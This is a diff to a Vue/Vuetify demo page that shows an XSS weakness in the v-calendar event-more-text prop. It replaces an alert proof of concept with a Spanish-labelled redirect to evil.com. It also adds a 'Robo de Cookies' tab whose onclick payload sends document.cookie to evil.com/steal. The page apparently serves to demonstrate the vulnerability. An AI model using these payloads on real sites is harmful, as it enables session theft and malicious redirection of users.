@@ -1,14 +1,15 @@
 <template>
   <v-card>
     <v-tabs v-model="tab" background-color="primary" dark>
-      <v-tab>Vulnerable Example</v-tab>
-      <v-tab>Default Prop Value</v-tab>
+      <v-tab>Redirección maliciosa</v-tab>
+      <v-tab>Robo de Cookies</v-tab>
+      <v-tab>Comportamiento normal</v-tab>
     </v-tabs>
 
     <v-tabs-items v-model="tab">
       <v-tab-item>
         <v-card flat>
-          <v-card-title>Bad Actor Usage</v-card-title>
+          <v-card-title>Redirección maliciosa</v-card-title>
           <v-card-text>
             <v-row>
               <v-col cols="12">
@@ -21,7 +22,7 @@
   color="primary"
   type="month"
   event-more
-  event-more-text="&lt;span onclick=alert('XSS')&gt;🚨 Click Here&lt;span&gt;"
+  event-more-text="&lt;span onclick=&quot;window.location='https://evil.com'&quot;&gt;🚨 Click Here&lt;/span&gt;"
 /&gt;</pre
                   >
                 </v-card>
@@ -35,7 +36,43 @@
                 color="primary"
                 type="month"
                 event-more
-                event-more-text="<span onclick=alert('XSS')>🚨 Click Here</span>"
+                event-more-text="<span onclick=&quot;window.location='https://evil.com'&quot;>🚨 Click Here</span>"
+              />
+            </v-sheet>
+          </v-card-text>
+        </v-card>
+      </v-tab-item>
+      
+      <v-tab-item>
+        <v-card flat>
+          <v-card-title>Robo de Cookies</v-card-title>
+          <v-card-text>
+            <v-row>
+              <v-col cols="12">
+                <v-card outlined class="pa-4 mb-4">
+                  <pre class="code-preview mb-0">
+&lt;v-calendar
+  :now="today"
+  :value="today"
+  :events="events"
+  color="primary"
+  type="month"
+  event-more
+  event-more-text="&lt;span onclick=&quot;fetch('https://evil.com/steal?cookies=' + encodeURIComponent(document.cookie)).catch(()=&gt;alert('Cookies robadas: ' + document.cookie))&quot;&gt;🚨 Click Here&lt;/span&gt;"
+/&gt;</pre
+                  >
+                </v-card>
+              </v-col>
+            </v-row>
+            <v-sheet height="380">
+              <v-calendar
+                :now="today"
+                :value="today"
+                :events="events"
+                color="primary"
+                type="month"
+                event-more
+                event-more-text="<span onclick=&quot;fetch('https://evil.com/steal?cookies=' + encodeURIComponent(document.cookie)).catch(()=>alert('Cookies robadas: ' + document.cookie))&quot;>🚨 Click Here</span>"
               />
             </v-sheet>
           </v-card-text>
@@ -44,7 +81,7 @@
 
       <v-tab-item>
         <v-card flat>
-          <v-card-title>Default Prop Value and Usage</v-card-title>
+          <v-card-title>Comportamiento normal</v-card-title>
           <v-card-text>
             <v-row>
               <v-col cols="12">
